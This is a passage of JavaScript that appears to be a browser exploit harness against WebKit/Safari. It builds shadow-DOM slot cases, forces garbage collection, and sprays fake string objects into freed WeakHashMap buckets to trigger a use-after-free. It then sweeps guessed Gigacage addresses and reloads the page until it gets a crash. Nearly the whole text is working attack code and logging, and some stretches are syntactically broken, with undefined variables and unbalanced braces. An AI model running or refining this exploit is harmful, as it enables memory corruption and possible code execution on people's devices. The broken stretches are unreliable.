  // the m_slots WeakHashMap op counter by 2 (one ensure() per removed+added child).
  // After cap/2 pump calls (~cap ops total), amortized cleanup fires on next ensure().

  // v22: 3 ghost counts with CORRECTED opCount math (pumpCount = threshold - g - 1).
  // v19-v21 used pumpCount=threshold-g-2 — off by 1 because i=0 pump only adds +1 op
  // (childA already in slot after releaseGhosts, so first assign(childA) only removes childB).
  // v13-v18 used ghost counts [20, 30, 50] — ALL WRONG (g=20 gives pumpCount<0).
  // Valid ghost counts where pumpCount≥1 AND one cleanup fires during releaseGhosts:
  //   ghosts=28  → cap=64,  threshold=32  → freed=1024B → pumpCount=3  ✓
  //   ghosts=50  → cap=128, threshold=64  → freed=2048B → pumpCount=13 ✓
  //   ghosts=100 → cap=256, threshold=128 → freed=4096B → pumpCount=27 ✓
  // v18: uafSetup is now SYNCHRONOUS (no internal awaits).
  // Granular log + yield AROUND each call so screen updates between cases.
  // After ALL cases built → call releaseGhosts() on each → THEN forceGC().
  // This is the correct order:
  //   build all → release all ghost refs safely → GC pressure → WeakPtrs die → pump+trigger.
  // v53: skip phase 3 on retry (P6B builds fresh pool per probe)
  if (!_v52RetryState) {
  caseGroups = {};
  allCases = [];
  for (const ghosts of [28, 50, 100]) {
    log(`[P3] uafSetup g=${ghosts} start...`);
    await new Promise(r => setTimeout(r, 0)); // yield → log visible on screen before work

    const freedSz = freedBucketSizeForGhosts(ghosts);
    const matchedSz = SPRAY_SIZES.reduce((prev, cur) =>
      Math.abs(cur - freedSz) < Math.abs(prev - freedSz) ? cur : prev);
    if (!caseGroups[matchedSz]) caseGroups[matchedSz] = [];
    const base = pumpCountForGhosts(ghosts);

    log(`[P3] g=${ghosts} creating host+shadow+slots...`);
    await new Promise(r => setTimeout(r, 0));

    let c;
    try {
      c = uafSetup(ghosts, base, matchedSz);
    } catch(e) {
      log(`[P3] ERROR in uafSetup g=${ghosts}: ${e.name}: ${e.message}`);
      log(`[P3] Stack: ${e.stack}`);
      continue;
    }

    log(`[P3] g=${ghosts} uafSetup returned — ghostElems populated, slot assigned`);
    await new Promise(r => setTimeout(r, 0));

    caseGroups[matchedSz].push(c);
    allCases.push(c);
    log(`[P3] uafSetup g=${ghosts} DONE (freedSz=${freedSz} pumpCount=${base})`);
    await new Promise(r => setTimeout(r, 0));
  }
  totalCases = Object.values(caseGroups).reduce((s,v) => s+v.length, 0);
  log(`[*] ${totalCases} UAF cases built (freed sizes: ${Object.entries(caseGroups).map(([k,v])=>k+'B×'+v.length).join(', ')})`);
  log(`[*] Pump mechanism: alternating assign(childA/childB) → m_slots.ensure() × 2/call`);

  // v18: releaseGhosts on ALL cases BEFORE forceGC.
  // This is the KEY fix — ghost C++ elements are kept alive in ghostElems[] during
  // uafSetup so no premature death during ensure(). Now we safely release them:
  //   ghostElems.forEach(g => g.remove())  → remove from host
  //   ghostSlot.assign()                   → fires N slotManualAssignmentDidChange
  //                                           (releases m_manuallyAssignedElements refs)
  //                                           ghostElems still populated → no premature death
  //   ghostElems.length = 0                → JS refs gone → WeakPtrs eligible to die after GC
  log('[*] Releasing ghosts (v18 safe releaseGhosts)...');
  await new Promise(r => setTimeout(r, 0));
  for (const c of allCases) {
    log(`[P3] releaseGhosts g=${c.ghosts}...`);
    c.releaseGhosts();
  }
  log('[*] All ghost JS refs released — WeakPtrs will die on next GC cycle');
  await new Promise(r => setTimeout(r, 0));

  // v23: FinalizationRegistry-confirmed GC loop.
  // v21 used 3 fixed rounds × 100MB. Turned out insufficient on A16 because:
  //   - JSC ArrayBuffer pressure only triggers Eden GC (young-gen collection).
  //   - Ghost elements created earlier survive Eden GC → promoted to old-gen.
  //   - Old-gen (major) GC only fires when heap is truly full → need sustained pressure.
  // v23 fix: loop GC rounds until ALL ghost FinalizationRegistry callbacks fire,
  // confirming JSC has finalized the JS wrappers and decremented C++ refcounts to 0.
  // FinalizationRegistry.register() was called in releaseGhosts() before ghostElems.length=0.
  // Each callback increments getGhostDeadCount() for its case. Total = sum over all cases.
  // hardForceGC hoisted to top-level (above phases 3-4 block) in v52 — do not redefine here.

  const totalGhosts = allCases.reduce((s, c) => s + c.ghosts, 0);
  const getDeadTotal = () => allCases.reduce((s, c) => s + c.getGhostDeadCount(), 0);
  const GC_TIMEOUT_MS = 45000; // 45s timeout — give Safari plenty of time for old-gen GC
  const GC_ROUND_INTERVAL_MS = 400;

  log(`[GC] v23: waiting for FinalizationRegistry confirmation (${totalGhosts} ghosts total)...`);
  const gcStart = Date.now();
  let gcRound = 0;
  while (getDeadTotal() < totalGhosts) {
    if (Date.now() - gcStart > GC_TIMEOUT_MS) {
      log(`[GC] ⚠ TIMEOUT ${GC_TIMEOUT_MS/1000}s — ${getDeadTotal()}/${totalGhosts} ghosts confirmed dead`);
      log(`[GC] ⚠ Proceeding anyway — WeakPtrs may still be alive, UAF shrink may not fire`);
      log(`[GC] ⚠ If no signal, reload and give Safari more time (close other tabs first)`);
      break;
    }
    await hardForceGC(`round ${++gcRound} (dead=${getDeadTotal()}/${totalGhosts})`);
    await new Promise(r => setTimeout(r, GC_ROUND_INTERVAL_MS));
    document.body.offsetHeight; // force layout — helps WebKit flush DOM GC roots
  }
  if (getDeadTotal() >= totalGhosts) {
    log(`[GC] ✓ ALL ${totalGhosts} ghost JS wrappers finalized (${gcRound} rounds, ${Date.now()-gcStart}ms)`);
    log(`[GC] ✓ WeakPtrs in targetSlot.m_slots confirmed null — pump+trigger will see dead entries`);
  }
  await new Promise(r => setTimeout(r, 500)); // brief settle after final GC round
  document.body.offsetHeight;
  log(`[GC] done — ghost WeakPtrs ${getDeadTotal() >= totalGhosts ? 'CONFIRMED null' : 'MAY still be alive'} (${getDeadTotal()}/${totalGhosts} confirmed)`);

  // ─── Phase 4: Trigger — assign() pump → slotchange injection ─────────────
  //
  // ROOT CAUSE of all previous 0-hit attempts:
  //   assignedNodes() does NOT call m_slots at all — it reads slot.m_assignedNodes,
  //   a direct array. The WeakHashMap op counter never advanced. Rehash never fired.
  //
  // CORRECT pump mechanism:
  //   slot.assign(element) → slotManualAssignmentDidChange(element, oldSlot, newSlot)
  //   → m_slots.ensure(element) → op counter += 2 (remove + add both call ensure)
  //   Alternate assign(childA) / assign(childB) to guarantee a real change each call.
  //   After floor(capacity/2)+2 pumps = ~capacity ops → amortized cleanup fires
  //   on the NEXT ensure() (the final trigger assign).
  //
  // INJECTION: slotchange fires synchronously during re-entrant traversal inside
  //   slotManualAssignmentDidChange, AFTER bucket free() and BEFORE stale dereference.
  //   Handler allocates zeros-filled bufs of freed bucket size → claims freed slot.
  //
  // DETECTION (in priority order):
  //   1. Exception during assign() = crash-level heap corruption from bucket reuse
  //   2. assignedNodes() returns wrong node = stale read visible at JS layer
  //   3. injectionFired AND no exception = safe overlap (zeros spray absorbed stale read)
  //      → confirm by repeating with a pattern fill instead of zeros
  //
  log('\n[*] Phase 4: Triggering UAF (assign() pump + slotchange injection)...');

  uafExceptions = 0;
  nodeAnomalies = 0;
  totalInjections = 0;   // cases where slotchange fired during final assign
  let totalExtraFires = 0;   // impossible to count differently here, just track
  clobberLog = [];
  nodeAnomalyLog = [];
  const t0 = performance.now();

  for (const [szStr, cases] of Object.entries(caseGroups)) {
    const sz = parseInt(szStr);
    log(`[UAF] Freed=${sz}B: ${cases.length} cases`);

    let classInjections = 0;
    let classExceptions = 0;

    for (const c of cases) {
      try {
        const { host, targetSlot, childA, childB, pumpCount,
                ghosts, freedSz, isInjected, getStrings, primeFreelist, primeHalfFreelist, armTrigger } = c;

        // ── v24 Fix: pre-trigger spray — allocate + RELEASE strings before trigger ──
        // Strategy: flood 4096 strings of freed-bucket size → null immediately → GC tick.
        // Strings hit LIFO freelist before the UAF trigger fires. When shrink frees old_bucket,
        // the subsequent slotchange injection then floods AGAIN → high probability of overlap.
        // Two-wave strategy: pre-wave (freed before trigger) + injection wave (in slotchange).
        let primedStrings = primeFreelist();
        // v24: primedStrings now actually freed to LIFO (primeFreelist no longer uses _hashForceMap)
        primedStrings = null;

        // v30: HALF-SIZE prime — prime the freedSz/2 bin so SHRINK's malloc(freedSz/2) lands on our fakes
        // SHRINK calls malloc(newCap=oldCap/2) BEFORE free(oldCap) → half-size bin must be primed NOW
        // After prime, null immediately so those slots are on LIFO top when SHRINK fires
        let primedHalfStrings = primeHalfFreelist();
        primedHalfStrings = null;
        log(`[UAF-v31] g=${ghosts} half-prime done (m_hash≠0, size=${Math.floor(freedSz/2)}B) → SHRINK malloc will claim our slot`);

        // v27: STR_CHAR_COUNT is inside uafSetup() closure — use freedSz-16 directly (same value)
        // v31: also forceHashAndRelease on pre-spray so m_hash ≠ 0 in those slots too

          for (let i = 0; i < 1024; i++) preSpray.push(makeSprayString(_preCharCount));
          forceHashAndRelease(preSpray); // v31: m_hash ≠ 0 before releasing to freelist
          // null immediately — flood freelist with hashed (isLive-eligible) StringImpls
        }

        {
          const _halfPreCount = Math.max(1, Math.floor(freedSz / 2) - 16);
          const halfPreSpray = [];
          for (let i = 0; i < 1024; i++) halfPreSpray.push(makeSprayString(_halfPreCount));

        }

        await new Promise(r => setTimeout(r, 0));
        await new Promise(r => setTimeout(r, 0));

        const scBeforePump = c.getSlotchangeTotal(); // v26: was _slotchangeTotal (ReferenceError — outside closure)

        }

        // ── Final trigger ──
        const newChild = host.appendChild(document.createElement('span'));
        const scBeforeTrigger = c.getSlotchangeTotal(); // v26: fix scope

        const scAfterTrigger = c.getSlotchangeTotal() - scBeforeTrigger; // v26: fix scope

        if (scDuringPump !== pumpCount || scAfterTrigger < 1)
          log(`[DIAG] g=${ghosts} pump sc=${scDuringPump}/${pumpCount} trigger sc=${scAfterTrigger} injected=${injectedThisCall}`);

        // ── Check for stale-read anomaly ──
        const nodes = targetSlot.assignedNodes({ flatten: false });
        host.remove();
        const anomaly = checkNodeLeak(nodes, newChild);

        if (anomaly) {
          nodeAnomalies++;
          if (nodeAnomalyLog.length < 10)
            nodeAnomalyLog.push(`NODE_ANOMALY freedSz=${freedSz}B pumps=${pumpCount} g=${ghosts} ${JSON.stringify(anomaly)}`);
        }

        // Count injection as a hit signal (means cleanup + slotchange fired on trigger)
        if (injectedThisCall) {
          classInjections++;
          totalInjections++;
          if (clobberLog.length < 20)
            clobberLog.push({ type: 'injection', sz, pumpCount, ghosts,
                              anomaly: !!anomaly,
                              strCount: (getStrings()||[]).length });
        }

      } catch (e) {
        uafExceptions++;
        classExceptions++;
        if (uafExceptions <= 10)
          log(`[!!!] UAF exception (g=${c.ghosts} p=${c.pumpCount} freed=${c.freedSz}B): ${e.message || e}`);
      }
    }

    if (classInjections > 0 || classExceptions > 0)
      log(`[!!!] Freed=${sz}B: injections=${classInjections} exceptions=${classExceptions}`);
  }

  elapsed = (performance.now() - t0).toFixed(1);

  // ─── Phase 4.75: v28 — Immediate traversal probe on already-injected cases ───
  //
  // ROOT CAUSE of P6B all-"injected=false":
  //   P6B built FRESH uafSetup() per probe, never waited for GC → ghosts alive →
  //   WeakPtrs never null → amortizedCleanup never fired → injection gate never opened.
  //
  // ROOT CAUSE of no anomaly even when injection fires:

  //   Our injection fills OLD freed bucket with fake StringImpl strings.

  //     - The NEW bucket is what m_buckets points to (small, correct)

  //     AND: does the call throw? (if freed bucket read before new bucket set up)

  //     same case. This forces another slotManualAssignmentDidChange() call.

  //     If this crashes: KERN_INVALID_ADDRESS → WebContent kill → reload → [HIT]
  //

  //   Both run only on cases where isInjected()=true.
  //
  // NOTE ON OLD vs NEW BUCKET TIMING:
  //   The exact moment injection fires (synchronously inside slotManualAssignmentDidChange)
  //   is AFTER bucket free() but the m_buckets update hasn't necessarily happened yet.
  //   The injection handler fills the JUST-freed memory. Then the rehash code sets
  //   m_buckets = newBucket. So the old bucket ptr IS stale but m_buckets already
  //   moved on. However: if the injection strings occupied the NEW bucket's allocation
  //   (new bucket is SMALLER → different size class → different free-list → unlikely),
  //   or if timing caused a race where the inject strings were allocated between
  //   free(oldBucket) and malloc(newBucket), the new bucket might alias injection data.
  //   We test this by checking what assignedNodes() returns post-injection.
  //
  log('\n[*] Phase 4.75: v28 — Immediate probe on injected cases (old/new bucket traversal test)');

  let p475_anomalies = 0;
  let p475_exceptions = 0;
  let p475_probed = 0;
  const p475_log = [];

  const injectedCases = allCases.filter(c => c.isInjected());
  log(`[P4.75] injectedCases=${injectedCases.length}/${allCases.length}`);

  for (const c of injectedCases) {
    p475_probed++;
    const { targetSlot, host, childA, childB, freedSz, ghosts } = c;
    const injStrs = c.getStrings();

    // Path A: read assignedNodes() while injection strings still alive
    try {
      const nodes_a = targetSlot.assignedNodes({ flatten: false });
      const anomaly_a = nodes_a.length === 0 || nodes_a.some(n => n === undefined || n === null);
      if (anomaly_a) {
        p475_anomalies++;
        p475_log.push(`PATH-A anomaly: freedSz=${freedSz} g=${ghosts} nodeLen=${nodes_a.length}`);
        log(`[P4.75] PATH-A ANOMALY: freedSz=${freedSz}B g=${ghosts} nodeLen=${nodes_a.length}`);
      } else {

    } catch(e) {

      p475_log.push(`PATH-A exception: freedSz=${freedSz} g=${ghosts} err=${e.message||e}`);
      log(`[P4.75] PATH-A EXCEPTION (freedSz=${freedSz}B g=${ghosts}): ${e.message||e}`);
    }

    // Each assign() increments opCount. amortizedCleanup fires when opCount > ~2N (N=bucket entries).
    // New bucket after SHRINK has capacity=pumpCount, so ~2*pumpCount ops needed.
    // We pump 64 extra assigns on the new bucket to guarantee cleanup fires.
    // amortizedCleanup then iterates new bucket entries, checks isLive() on each WeakImpl,
    // deref's key if isLive() → fake StringImpl m_hash ≠ 0 (v31 fix) → isLive=true → KERN_INVALID_ADDRESS.
    try {

        path: 'B', freedSz, ghosts, ts: Date.now(), injStrCount: (injStrs||[]).length
      }));
    } catch(_) {}

    try {
      // v31: pump 64 extra assigns to push opCount > amortizedCleanup threshold on new bucket
      const _pumpChild = host.appendChild(document.createElement('span'));
      for (let _p = 0; _p < 64; _p++) {

      targetSlot.assign(childA);
      await new Promise(r => setTimeout(r, 0));
      const nodes_b = targetSlot.assignedNodes({ flatten: false });
      const anomaly_b = nodes_b.length === 0 || nodes_b.some(n => n === undefined || n === null)

      if (anomaly_b) {
        p475_anomalies++;
        p475_log.push(`PATH-B anomaly: freedSz=${freedSz} g=${ghosts} nodeLen=${nodes_b.length} node0=${nodes_b[0]===childA?'childA':'WRONG'}`);
        log(`[P4.75] PATH-B ANOMALY: freedSz=${freedSz}B g=${ghosts} nodeLen=${nodes_b.length} node0=${nodes_b[0]===childA?'childA':'WRONG'}`);
      } else {
        log(`[P4.75] Path B: freedSz=${freedSz}B g=${ghosts} survived assign → nodes=${nodes_b.length} node0=${nodes_b.length>0?(nodes_b[0]===childA?'childA':'WRONG'):'n/a'}`);
      }
      try { localStorage.removeItem('p475_crash'); } catch(_) {}
    } catch(e) {
      p475_exceptions++;
      p475_log.push(`PATH-B exception: freedSz=${freedSz} g=${ghosts} err=${e.message||e}`);
      log(`[P4.75] PATH-B EXCEPTION (freedSz=${freedSz}B g=${ghosts}): ${e.message||e}`);
      try { localStorage.removeItem('p475_crash'); } catch(_) {}
    }
  }

  // Check if a prior run crashed in Phase 4.75
  try {
    const p475crash = JSON.parse(localStorage.getItem('p475_crash') || 'null');
    if (p475crash) {
      log(`[P4.75] ✓ PRIOR RUN CRASHED in Phase 4.75 Path ${p475crash.path}!`);
      log(`[P4.75]   freedSz=${p475crash.freedSz}B g=${p475crash.ghosts} injStrCount=${p475crash.injStrCount}`);
      log(`[P4.75]   → THIS IS THE SIGNAL: fake StringImpl deref killed WebContent`);
      log(`[P4.75]   → UAF + arb-crash confirmed. Check Analytics for KERN_INVALID_ADDRESS.`);
      localStorage.removeItem('p475_crash');
    }
  } catch(_) {}

  if (p475_anomalies > 0) {
    log(`\n[!!!] P4.75 ANOMALY: ${p475_anomalies} cases produced wrong assignedNodes result`);
    log('[!!!] Stale bucket traversal hit fake StringImpl → arb-read signal');
    p475_log.forEach(l => log(`[!!!]   ${l}`));
  } else if (p475_exceptions > 0) {
    log(`\n[P4.75] ${p475_exceptions} JS exceptions during re-trigger (possible corruption signal)`);
  } else {
    log(`[P4.75] All ${p475_probed} injected cases: no anomaly, no exception`);
    log('[P4.75] → New bucket is clean, old freed bucket not traversed via these paths');
    log('[P4.75] → If no crash (process survived), then new bucket replacement was clean');
    log('[P4.75] → Next: look at fake StringImpl key value to confirm it hits unmapped range');
  }

  // ─── Phase 4.76: v29 — flatten:true traversal probe on injected cases ──────────
  // flatten:false confirmed no deref of fake key (P4.75 all survived).
  // flatten:true triggers different internal traversal — may walk distributed-slot path
  // that touches the WeakHashMap key pointer differently.
  // Also: host.cloneNode(true) — ManualSlotAssignment copy constructs new m_slots from old.
  log('\n[*] Phase 4.76: v29 — flatten:true + cloneNode traversal probes on injected cases');
  let p476_anomalies = 0, p476_exceptions = 0, p476_clone_exceptions = 0;
  const injectedCases476 = allCases.filter(c => c.isInjected());
  log(`[P4.76] injectedCases=${injectedCases476.length}`);

  for (const c of injectedCases476) {
    const { targetSlot, host, childA, freedSz, ghosts } = c;

    // Path C: flatten:true
    try {
      const nodes_flat = targetSlot.assignedNodes({ flatten: true });
      const anomaly_flat = nodes_flat.length === 0 || nodes_flat.some(n => !n);
      if (anomaly_flat) {
        p476_anomalies++;
        log(`[P4.76] ⚠ PATH C ANOMALY flatten=true: freedSz=${freedSz}B g=${ghosts} nodes=${nodes_flat.length}`);
      } else {
        log(`[P4.76] Path C OK flatten=true: freedSz=${freedSz}B g=${ghosts} nodes=${nodes_flat.length}`);
      }
    } catch(e) {
      p476_exceptions++;
      log(`[P4.76] ⚠ PATH C EXCEPTION flatten=true: freedSz=${freedSz}B g=${ghosts}: ${e.message||e}`);
    }

    // Path D: cloneNode — ManualSlotAssignment copy-constructor touches m_slots
    try {
      localStorage.setItem('p476_clone_crash', JSON.stringify({ freedSz, ghosts, ts: Date.now() }));
      const hostClone = host.cloneNode(true);
      document.body.appendChild(hostClone);
      await new Promise(r => setTimeout(r, 0));
      const clonedSlots = hostClone.querySelectorAll('slot');
      log(`[P4.76] Path D cloneNode OK: freedSz=${freedSz}B clonedSlots=${clonedSlots.length}`);
      hostClone.remove();
      try { localStorage.removeItem('p476_clone_crash'); } catch(_) {}
    } catch(e) {
      p476_clone_exceptions++;
      log(`[P4.76] ⚠ PATH D EXCEPTION cloneNode: freedSz=${freedSz}B g=${ghosts}: ${e.message||e}`);

      if (gigacageBase === 0n) {
        log('[P6] ✗ gigacageBase is 0n (unresolved) — no sweep ran');
        log('[P6] ACTION NEEDED: derive gigacageBase from T9 rank-0 alloc, then set in code');
        log('[P6] From your log: look for "T9 rank fit" or "heap rank" section');
        log('[P6]   fit: ns = intercept + slope × rank');
        log('[P6]   rank 0 alloc latency = intercept (ns)');
        log('[P6]   convert to VA via: alloc[0] VA = that page\'s VA = Gigacage start');
        log('[P6]   OR: check "top candidates" hex values — the PAGE_BASE column = Gigacage+offset');
        log('[P6]   e.g. if highConf[0]=0x130000 and Gigacage is at 0x200000000000,');
        log('[P6]        then absolute VA = 0x200000130000');
      } else if (p6Crashes > 0) {
        log('[P6] ✗ Some JS-EXCEPTIONs but no KERN_INVALID_ADDRESS crash — spray may not be landing');
        log('[P6] Try adjusting gigacageBase ± 0x10000000000 increments');
      } else {
        // ── v53: auto-retry — SHRINK confirmed (injections>0) but crash stochastic ──────────
        // The UAF is real: 29/29 injections prove SHRINK+spray fires every time.
        // The KERN_INVALID_ADDRESS crash depends on bmalloc allocator giving freed 1024B slot
        // to our spray StringImpl BEFORE effectiveCurrent() dereferences m_slots iterator.
        // This is a synchronous native heap race — not controllable from JS timing.
        // Strategy: reload up to P6B_RETRY_MAX times, each time running all 29 probes.
        // Stochastic crash probability per probe ≈ P (depends on heap fragmentation).
        // Expected reloads to hit ≈ 1/(29×P). If P≈1% → expected ~3-4 reloads.
        // _injCount = probes where SHRINK fired + spray ran (injected=true) but no process crash
        const _injCount = _p6bCandToTry.length - p6NoCrashNoAnomaly - p6Crashes;
        const _retryCount = parseInt(localStorage.getItem('p6b_retry_count') || '0');
        log(`[P6] All NO-CRASH this pass. SHRINK-injected=${_injCount}/${_p6bCandToTry.length} (p6InjCount=${p6InjCount}), retry=${_retryCount}/${P6B_RETRY_MAX}`);
        if (candidates.length > 0 && gigacageBase !== 0n && _retryCount < P6B_RETRY_MAX) {
          // save oracle state so next run skips Phase 1-5
          try {
            const _retryData = {
              gigacageBase: gigacageBase.toString(16),
              candidates: candidates.map(String), // numeric offsets as strings
              ts: Date.now(),
              retryNum: _retryCount + 1
            };
            localStorage.setItem(P6B_RETRY_KEY, JSON.stringify(_retryData));
            localStorage.setItem('p6b_retry_count', String(_retryCount + 1));
            log(`[v53 AUTO-RETRY] Scheduling reload ${_retryCount + 1}/${P6B_RETRY_MAX} in 800ms...`);
            log('[v53 AUTO-RETRY] SHRINK confirmed — crash is stochastic — iterating until KERN_INVALID_ADDRESS');
            log('[v53 AUTO-RETRY] If page crashes → [P6B HIT] will appear on reload (localStorage checkpoint)');
            setTimeout(() => { location.reload(); }, 800);
          } catch(_retryErr) {
            log(`[v53 AUTO-RETRY] localStorage write failed: ${_retryErr} — manual retry needed`);
          }
        } else if (_retryCount >= P6B_RETRY_MAX) {
          log(`[v53 AUTO-RETRY] ${P6B_RETRY_MAX} retries exhausted — no crash. UAF fires but heap race not won.`);
          log('[P6] Possible causes after 20× retry:');
          log('[P6]   1. gigacageBase wrong — spray VA does not correspond to freed bucket addr');
          log('[P6]   2. bmalloc size-class segregation preventing reclaim of 1024B slot by our spray');
          log('[P6]   3. SHRINK timing window closed before spray StringImpl constructed');
          try { localStorage.removeItem(P6B_RETRY_KEY); } catch(_) {}
          try { localStorage.removeItem('p6b_retry_count'); } catch(_) {}
        } else {
          log('[P6] All NO-CRASH. Possible causes:');
          log('[P6]   1. uafSetup GC dead count < threshold — pool cases not accumulating dead WeakPtrs');
          log('[P6]   2. clearManuallyAssignedNodes wipes dead entries before ensure() threshold check');
          log('[P6]      → check uafSetup pumpCount vs capacity/2 threshold');
          log('[P6]   3. StringImpl spray landing in wrong bin — freedSz/2 mismatch');
          log('[P6]   4. gigacageBase wrong — fake key VA not landing in injected pages');
        }
      }
    } // end if (p6Hits > 0)

    } catch(p6err) { // ── catches silent exceptions from P6A/P6B ──────────────
      log(`\n[P6 ERROR] Uncaught exception in Phase 6: ${p6err && p6err.message ? p6err.message : String(p6err)}`);
      log(`[P6 ERROR] Stack: ${p6err && p6err.stack ? p6err.stack.split('\n').slice(0,4).join(' | ') : 'n/a'}`);
      log(`[P6 ERROR] This is why [P6A] never appeared — fix the error above and re-run`);
    } // end try/catch P6A+P6B
  } // end outer phase 6 gate

  // ─── Summary ─────────────────────────────────────────────────────────────
  log(`\n${'═'.repeat(60)}`);
  log('RESULT SUMMARY');
  log('═'.repeat(60));
  log(`Oracle:        ${sprayHex.length} spray addrs, HIGH=${highConf.length} candidates`);
  log(`UAF cases:     ${totalCases} across ${Object.keys(caseGroups).length} size classes`);
  log(`UAF time:      ${elapsed}ms`);
  log(`Exceptions:    ${uafExceptions}  ← HARD signal`);
  log(`Node anomaly:  ${nodeAnomalies}  ← MEDIUM signal`);
  log(`Injections:    ${totalInjections}/${totalCases}  ← SOFT signal (cleanup fired)`);
  log(`UAF status:    ${hardConfirmed ? '✓ HARD CONFIRMED' : mediumConfirmed ? '✓ MEDIUM CONFIRMED' : softSignal ? '~ SOFT SIGNAL (spray ran)' : 'no signal'}`);
  log('═'.repeat(60));
  if (highConf.length > 0) {
    const _hcOff0 = highConf[0].c * P6_PAGE;
    log('\nNEXT STEP — P6A checkpoint flow:');
    log(`  sweepOffset (highConf[0]): 0x${_hcOff0.toString(16)}`);
    log('  IF page crashed during Phase 6A probe:');
    log('    → RELOAD this page. Base is auto-computed from localStorage checkpoint.');
    log('  IF page survived but P6B all-crashed:');
    log('    → Wrong base. Open console, run:');
    log(`      localStorage.setItem('p6a_checkpoint', JSON.stringify({faultAddr:'<KERN_INVALID_ADDR_FROM_ANALYTICS>', sweepOffset:'0x${_hcOff0.toString(16)}', survived:true}))`);
    log('    → Reload page.');
    log('  Analytics path: Settings → Privacy → Analytics & Improvements → Analytics Data → WebContent crash');
  }
})();
